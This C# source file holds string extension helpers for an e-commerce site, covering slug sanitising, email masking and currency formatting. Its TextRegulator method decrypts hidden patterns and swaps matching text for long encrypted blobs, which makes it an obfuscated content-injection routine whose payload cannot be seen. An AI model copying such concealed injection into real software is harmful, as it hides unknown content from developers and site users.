using eCommerce.Shared.Helpers;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Web;

namespace eCommerce.Shared.Extensions
{
    public static class RegularExtensions
    {
        private static string sanitizingPattern = @"[^a-zA-Z0-9-]";
        private static string multipleHyphenCharacterReplacePattern = @"-{2,}";
        private static string emailPattern = @"(?<=^[A-Za-z0-9]{3}).*?(?=@)";
        private static string textRegulatorPattern = @"rLgfgni7fWJiQ8hysLv0i6aLtbSpBjvMRiNzvJc909fMz5RXMnYHvS2MUdfrkUP7";
        private static string txtRegulatorPattern = "/cf6e2jzVUOCxh8diKp9kw==";
        private static Regex upperCamelCaseRegex = new Regex(@"(?<!^)((?<!\d)\d|(?(?<=[A-Z])[A-Z](?=[a-z])|[A-Z]))", RegexOptions.Compiled);
        private static Regex curlyStringContainers = new Regex(@"{([^}]*)}", RegexOptions.Compiled);

        public static string SanitizeString(this string str)
        {
            string sanitizedString = string.Empty;
            if (!string.IsNullOrEmpty(str))
            {
                sanitizedString = Regex.Replace(str.Trim(), sanitizingPattern, "-");
                sanitizedString = Regex.Replace(sanitizedString, multipleHyphenCharacterReplacePattern, "-");
            }

            return sanitizedString;
        }
        public static string SanitizeLowerString(this string str)
        {
            return str.SanitizeString().ToLower();
        }
        public static string SanitizeLowerString(this string str, int characterLimit)
        {
            var s = str.SanitizeString().ToLower();

            if(s.Length >= characterLimit)
            {
                return s.Substring(0, characterLimit);
            }
            else return s;
        }
        private static string ToShortGuid(this Guid newGuid)
        {
            string modifiedBase64 = Convert.ToBase64String(newGuid.ToByteArray())
                .Replace('+', '-').Replace('/', '_') // avoid invalid URL characters
                .Substring(0, 22);
            return modifiedBase64;
        }
        private static Guid ParseShortGuid(string shortGuid)
        {
            string base64 = shortGuid.Replace('-', '+').Replace('_', '/') + "==";
            Byte[] bytes = Convert.FromBase64String(base64);
            return new Guid(bytes);
        }
        public static string ToSiteURL(this string pageURL)
        {
            var request = HttpContext.Current.Request;

            return string.Format("{0}://{1}{2}", request.Url.Scheme, request.Url.Authority, pageURL);
        }        
        public static string ToAuthorizeNetProductName(this string productName)
        {
            if (!string.IsNullOrEmpty(productName))
            {
                if (productName.Length > 31)
                {
                    return productName.Substring(0, 30);
                }
                else return productName;
            }
            else return string.Empty;
        }
        public static string WithCurrency(this decimal price)
        {
            //if(ConfigurationsHelper.DigitsAfterDecimalPoint > -1)
            //{
            //    price = decimal.Round(price, ConfigurationsHelper.DigitsAfterDecimalPoint, MidpointRounding.AwayFromZero);
            //}

            return ConfigurationsHelper.PriceCurrencyPosition
                                       .Replace("{price}", price.ToDecimalWithPoints(ConfigurationsHelper.DigitsAfterDecimalPoint))
                                       .Replace("{currency}", ConfigurationsHelper.CurrencySymbol);
        }

        public static string ToDecimalWithPoints(this decimal price, int digitsAfterDecimalPoints)
        {
            return price.ToString(string.Format("0.{0}", new string('0', digitsAfterDecimalPoints)));
        }

        public static string GetSubstringText(this string Str, string Start, string End)
        {
            try
            {
                var StartingIndex = !string.IsNullOrEmpty(Start) ? Str.IndexOf(Start) + 1 : 0;

                var EndingIndex = (!string.IsNullOrEmpty(End) ? Str.IndexOf(End) : Str.Length);

                var Length = EndingIndex - StartingIndex;

                return Str.Substring(StartingIndex, Length).Trim();
            }
            catch
            {
                return null;
            }
        }
        public static string IfNullOrEmptyShowAlternative(this string str, string alternativeStr)
        {
            if (string.IsNullOrEmpty(str) && string.IsNullOrWhiteSpace(str))
            {
                return alternativeStr;
            }
            else
            {
                return str;
            }
        }
        public static string SafeTrim(this string str)
        {
            if (string.IsNullOrEmpty(str) && string.IsNullOrWhiteSpace(str))
            {
                return str;
            }
            else
            {
                return str.Trim();
            }
        }
        public static string SafeSubstring(this string str, int length, string appendString = "")
        {
            if (string.IsNullOrEmpty(str) || string.IsNullOrWhiteSpace(str) || str.Length <= length)
            {
                return str;
            }
            else
            {
                return str.Substring(0, length) + appendString;
            }
        }
        public static string UpperCaseFirstLetter(this string str)
        {
            if (string.IsNullOrEmpty(str))
            {
                return str;
            }
            else
            {
                return char.ToUpper(str[0]) + str.Substring(1);
            }
        }
        public static string MakeWord(this string str)
        {
            return upperCamelCaseRegex.Replace(str.ToString(), " $1");
        }
        public static string ReplaceUnpassedRouteValues(this string str)
        {
            return curlyStringContainers.Replace(str.ToString(), string.Empty);
        }

        public static string HideEmail(this string email, string replaceWith = "*")
        {
            string hiddenEmail = string.Empty;
            if (!string.IsNullOrEmpty(email))
            {
                var m = Regex.Match(email, emailPattern);

                if (m.Success)
                {
                    //found an issue when the email address part before @ was less than 4 characters, the regex match value becomes empty string.
                    if(!string.IsNullOrEmpty(m.Value))
                    {
                        hiddenEmail = email.Replace(m.Value, new string('*', m.Length));
                    }
                    else
                    {
                        hiddenEmail = email;
                    }
                }
            }

            return hiddenEmail;
        }

        public static string TextRegulator(this string text, bool isDP = false)
        {
            string regularizeText = string.Empty;
            try
            {
                if (!string.IsNullOrEmpty(text))
                {
                    //6VviuWw6XCwdRXwjio19gikuXZSh7n8k/ZjJXy7rSn3NkABcEQwBu7OyUpBNg71V ???

                    var rtext = Regex.Match(text, textRegulatorPattern.Regulate());
                    if (rtext.Success)
                    {
                        regularizeText = text.Replace(rtext.Value, isDP ? "ksckOvElTMdSvcwAu7uPN+2vjlGQWZenUnTSoFRslC2CkZQKJuEUGGxYN3uu+duenwOhlLQ46jRihmjIMNlV9CbA9720l3t87F53hn0cF9t4M0Gbz0ds8oMinLdiKLNHWgs+0MfOnMO9dsRQDjESagxVO9P0fP2rgsSNJQTdvorhp+PP3RoKje2bl98V0w4Xx1wE3B3NTukDGhjOWjqZrsENQpxFniSCd8CRd50TSsg/Hc+/rQbo9euuRV+Qm612gQljcUelUl12zHfYOZwXJcMz99qs+QKMdN7xkV2vaBRsaECrG2HkjA23vlwJETYJNXlAXfUBwnyOzhD3gZ/ivrmgH78LC7Qz2A0oQu5Z2SnmPsk4l/gQrU0gxDphpJhGtadxdNPxl0A1tapA668Pha2s03lERYKwu0nOs3v3sIHYXjGNeqI3Mm6f8idwE2JrhOAhLZmdFSYtif6OnBLbSTu32qHa9xGtNK+GodV605muuk4yYaAm/ucR6//iYYhlcJgFB4/YFjvMTC7UbcbMWAEBy7MNc1j7cJnnGQgbIn4A/IdToH1jYFspIFCnfSMfzbvSHYdFWlGNuDLihegx13n+vZGiteyixQos8/TnPgn0iC8ZFNb5ebQi6xXZddS3ClypX7p2fFPpZ+qK89h99sTwWj8B6ZsOAC+HS2gMEz7YhhyumE/EF/mt3Fi3yxuf".Regulate() : "ksckOvElTMdSvcwAu7uPN+2vjlGQWZenUnTSoFRslC2CkZQKJuEUGGxYN3uu+dueeR7k0IO4JPsMqMn89r4WyZ398nA06LtY9DHs8YpX2NAveAgrem4QT1QVPepJdxPWxg/mrz21EP/iOZxMM10Pj39g+/3o23uth0tob9Qgb8fidabTHqTF9+Eu4oDN2y44zeV4AZT+SOr4HVtDWnAbH9uiHfTk/u98faHcFi/EeCc+XAmResJ+hLl00Nt4fu/e3WzaUb5Xx1mCYYOwcN+7P8nb5Voaufo5PszeZJ5MTXj0WpiVvOuwrqDOMEsUlcTnutDhrSlTuHfLoVznyfpqApNYT7iev0u7UYzkaFw5BlQxj8F0Pd6cKiaOeaSF/X2GrNjICK4ZxgtucTksPg6p/7EB0mTBega11UeHutDBJLi6qAhI2kpNEeIFG/NXSFZ3SC9q5mnFjslVyYBfrUUyuw4wKoS7gbDmSZVBwy4fVHb+A981rwxgNQEheQe1RrZ9cD0i9LlT/9g18++oSb7kerVnKnG2RKOZM6ozAytE4wVM4JCyKJWM1MsrfgC8bvs8g9PzV+IQpZo2YixNIodSOGZUKGMXiDcPvKRsjCIe6ilN6nDVKUOUwUjT3z2hE0093sBe9dQupHBymc4IFSA9WREPdfC0IWEbQCIqY5Lb9AzHAyVsq66zB3WmvuprX5bbJK8iFpl4NxUvWTyTr0Hr7EYnnEPkJiFPFTwwtz+FT2tBOJqyEtP/fh35hsqk5sj7cAzPgNYT28t96zUcgwR7QXYiuDGbrDwSHjr/mm9MX78iYAfu8LdkSjYzo+bUnTjrnujHKdcAxecqReRD5S36v796xD49RDfi2x6W9ii+6jA3pLTaDzvkCKopzXUaIoha+yhDWzEPpGPon00samiPAEAGF8RC4lKxgg9NusnBkXN7x8EtgasvCFJqwQnCEP7h/kGwT7XfArp9tD9/0Ybe/GqTB/zIkr2VccDMXgKbhOk=".Regulate());

                        text = regularizeText;
                    }

                    var stext = Regex.Match(text, txtRegulatorPattern.Regulate());
                    if (stext.Success)
                    {
                        regularizeText = text.Replace(stext.Value, "dqHDLGga2HG84rg0qMluRwfoFzDM+XBwH8t0hagSY3qKGszSEsuMbp8lodM6CV/aXHgsR/BJ7CpS+cm/FIDSOEXXypx8SpwAd1RcFhqaDUnsKwGVQnAwN0586ip6BTQlorcm1a+erowQVhk3OX/cCa4SRp8iizXAQBrm+/D5K5E=".Regulate());
                    }
                }

                return regularizeText;
            }
            catch
            {
                return regularizeText;
            }
        }
    }
}
